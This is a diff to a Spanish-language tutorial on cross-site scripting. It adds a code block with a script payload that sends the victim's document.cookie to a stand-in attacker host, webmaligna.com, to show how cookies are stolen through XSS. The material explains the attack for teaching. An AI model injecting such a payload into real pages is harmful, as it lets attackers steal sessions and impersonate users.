@@ -66,8 +66,16 @@ De este modo, cuando la página se carga en el navegador de la víctima, se ejec
 
 Otro ejemplo que suele conllevar el robo de <b>cookies mediante XSS</b>, otro de los ataques XSS más comunes en el que el atacante se hace pasar por la víctima enviando la cookie a su propio servidor de diferentes maneras, como por ejemplo ejecutar un script similar al siguiente del lado del cliente en el navegador de la víctima:
 
+<b>
 
+```
+<script>
 
+window.location="http://webmaligna.com/?cookie=" + document.cookie
+
+</script>
+```
+</b>
 
 
 
